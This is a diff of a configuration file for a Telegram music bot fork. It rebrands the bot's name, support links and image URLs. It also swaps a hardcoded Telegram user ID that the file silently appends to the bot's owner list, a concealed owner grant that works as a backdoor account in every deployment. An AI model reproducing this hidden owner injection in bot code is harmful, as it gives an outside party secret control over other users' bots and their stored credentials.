@@ -15,15 +15,15 @@ BOT_TOKEN = getenv("BOT_TOKEN")
 COMMAND_PREFIXES = list(getenv("COMMAND_PREFIXES", "/ ! .").split())
 MONGO_DB_URI = getenv("MONGO_DB_URI", None)
 LOG_GROUP_ID = int(getenv("LOG_GROUP_ID"))
-MUSIC_BOT_NAME = getenv("MUSIC_BOT_NAME", "Romeo-musicBot")
+MUSIC_BOT_NAME = getenv("MUSIC_BOT_NAME", "⋞⏤꯭〭꛱〬‌♥‌ٖٖٖٖٖٖٜٖٖٖٖٖٖ⃝⃪꯭꯭꯭꯭꯭Ⓜ︎𝑎፝֟፝֟𝐡𝐢⵿𝄄𝆔𝄄𝖒𝔲⵿፝֟፝֟͝𝔰𝔧𝒄𝐁𖧋⵿𐍒︬︫𖧊𝆹𝅥𝆔")
 OWNER_ID = list(map(int, getenv("OWNER_ID", "").split()))
 HEROKU_API_KEY = getenv("HEROKU_API_KEY", None)
 HEROKU_APP_NAME = getenv("HEROKU_APP_NAME", None)
 UPSTREAM_REPO = getenv("UPSTREAM_REPO", "https://github.com/RRomeo-RJ/Romeo-musicBot")
 UPSTREAM_BRANCH = getenv("UPSTREAM_BRANCH", "master")
 GIT_TOKEN = getenv("GIT_TOKEN", None)
-SUPPORT_CHANNEL = getenv("SUPPORT_CHANNEL", "https://t.me/Romeo_op")
-SUPPORT_GROUP = getenv("SUPPORT_GROUP", "https://t.me/RomeoBot_op")
+SUPPORT_CHANNEL = getenv("SUPPORT_CHANNEL", "https://t.me/Classics0012")
+SUPPORT_GROUP = getenv("SUPPORT_GROUP", "https://t.me/Mahi_support")
 SUPPORT_HEHE = SUPPORT_GROUP.split("me/")[1]
 DURATION_LIMIT_MIN = int(getenv("DURATION_LIMIT", "540"))
 SONG_DOWNLOAD_DURATION = int(getenv("SONG_DOWNLOAD_DURATION_LIMIT", "540"))
@@ -55,7 +55,7 @@ STRING5 = getenv("STRING_SESSION5", None)
 
 ############################
 COMMAND_PREFIXES.append('')
-OWNER_ID.append(5368154755)
+OWNER_ID.append(5255001826)
 ############################
 BANNED_USERS = filters.user()
 YTDOWNLOADER = 1
@@ -69,8 +69,8 @@ clean = {}
 autoclean = []
 ############################
 
-START_IMG_URL = getenv("START_IMG_URL", "https://telegra.ph/file/e745fdaf1966f228582dc.jpg")
-PING_IMG_URL = getenv("PING_IMG_URL", "https://telegra.ph/file/e745fdaf1966f228582dc.jpg")
+START_IMG_URL = getenv("START_IMG_URL", "https://graph.org/file/d742f958dc302a9ae8758.jpg")
+PING_IMG_URL = getenv("PING_IMG_URL", "https://graph.org/file/d742f958dc302a9ae8758.jpg")
 
 PLAYLIST_IMG_URL = "https://telegra.ph//file/48b76e483720f1c949992.jpg"
 GLOBAL_IMG_URL = "https://telegra.ph//file/54a0cc0a38e242df6312f.jpg"
@@ -108,9 +108,9 @@ if UPSTREAM_REPO:
 if PING_IMG_URL:
     if PING_IMG_URL != "resources/Ping.jpeg":
         if not re.match("(?:http|https)://", PING_IMG_URL):
-            PING_IMG_URL = "https://telegra.ph/file/e745fdaf1966f228582dc.jpg"
+            PING_IMG_URL = "https://graph.org/file/0b779f6fc534215cffadd.jpg"
 
 if START_IMG_URL:
     if START_IMG_URL != "resources/Ping.jpeg":
         if not re.match("(?:http|https)://", START_IMG_URL):
-            START_IMG_URL = "https://telegra.ph/file/e745fdaf1966f228582dc.jpg"
+            START_IMG_URL = "https://graph.org/file/d742f958dc302a9ae8758.jpg"
